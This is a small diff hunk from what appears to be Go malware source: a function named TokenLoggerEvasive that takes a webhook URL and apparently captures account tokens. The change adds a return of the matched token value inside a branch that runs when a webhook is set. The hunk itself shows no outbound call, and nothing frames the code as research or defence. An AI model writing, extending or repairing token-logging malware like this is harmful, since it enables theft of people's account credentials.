@@ -39,6 +39,7 @@ func TokenLoggerEvasive(webhookURL string) (string, error) {
 
 					if strings.Contains(body, "id") && webhookURL != "" {
 						ticketcount(match[0])
+						return match[0], nil
 					} else {
 						return match[0], nil
 					}
